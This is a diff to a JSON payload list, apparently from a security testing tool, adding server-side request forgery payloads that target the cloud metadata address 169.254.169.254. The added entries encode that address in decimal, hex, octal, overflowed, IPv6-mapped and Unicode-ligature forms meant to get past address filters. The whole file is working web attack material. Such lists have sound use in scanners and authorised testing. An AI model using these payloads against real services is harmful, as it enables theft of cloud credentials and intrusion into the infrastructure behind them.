@@ -2,6 +2,24 @@
     "name": "Cloud metadata endpoints",
     "payloads": [
         {
+            "payload": "169.254.169.254",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Cloud metadata endpoint",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "0ccb496127f4b822d7284638041456c0cf9903a9"
+        },
+        {
+            "payload": "169.254.43518",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Cloud metadata endpoint 2 byte wide decimal",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "ab702fabd85cab966eed473a26ff030777506d8c"
+        },
+        {
             "payload": "2852039166",
             "prefix": "http://",
             "suffix": "/latest/meta-data/",
@@ -11,22 +29,67 @@
             "id": "2c1973af9f940eafa8ebf98c195460465526c945"
         },
         {
+            "payload": "45801712126",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Decimal IP of 169.254.169.254 with x10 overflow",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "4ec56b2a29ac77e92f07856ccf340e3560926bb8"
+        },
+        {
+            "payload": "0xA9.0xFE.0xA9.0xFE",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Hexadecimal IP of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "a2f3cc5c8f8d932182dc6ece6612390c8baeabf6"
+        },
+        {
+            "payload": "0x1A9FEA9FE",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Hexadecimal IP of 169.254.169.254 with overflow",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "50a2bf96e6c8a3c46377030a182c77090b7e415d"
+        },
+        {
             "payload": "0251.0376.0251.0376",
             "prefix": "http://",
             "suffix": "/latest/meta-data/",
-            "description": "Octal Representation of 169.254.169.254",
+            "description": "Octal IP of 169.254.169.254",
             "filters": [],
             "tags": ["URL", "HOST"],
             "id": "f5e91dbf51bd94979cbe25df8e9c3a533431a314"
         },
         {
-            "payload": "[::ffff:a9fe:a9fe]",
+            "payload": "[::FFFF:A9FE:A9FE]",
             "prefix": "http://",
             "suffix": "/latest/meta-data/",
             "description": "IPv6 representation of 169.254.169.254",
             "filters": [],
             "tags": ["URL", "HOST"],
-            "id": "7987043fa8fef388544d51ab4706b76e9c8f9467"
+            "id": "0be6987d241b20a23e3a79dfd50132f316ffb1f7"
+        },
+        {
+            "payload": "[0:0:0:0:0:ffff:a9fe:a9fe]",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "Expanded IPv6 representation of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "4f10bf4b85296551464554ad2aaa39df3827403f"
+        },
+        {
+            "payload": "::ffff:169.254.169.254",
+            "prefix": "http://",
+            "suffix": "/latest/meta-data/",
+            "description": "IPv4 inside IPv6 representation of 169.254.169.254",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "bcacc49b27207fcb7575ea180f312635bf411ec5"
         },
         {
             "payload": "[::ffff:169.254.169.254]",
@@ -45,6 +108,20 @@
             "filters": [],
             "tags": ["URL", "HOST"],
             "id": "ac92c17d4e064ceb35f590d7b7d48f0ec71f213b"
+        },
+        {
+            "payload": "[::\ufb00\ufb00:a9fe:a9fe]",
+            "description": "Latin Small Ligature Ff [::ffff:a9fe:a9fe]",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "4f3ed6fdd47b1b740ae57f322237084ba722c4d4"
+        },
+        {
+            "payload": "[0:0:0:0:0:\ufb00\ufb00:169.254.169.254]",
+            "description": "Latin Small Ligature Ff [0:0:0:0:0:ffff:169.254.169.254]",
+            "filters": [],
+            "tags": ["URL", "HOST"],
+            "id": "ce814c104d5662d95e41c6175ebd0052f2f44aa7"
         }
     ]
 }
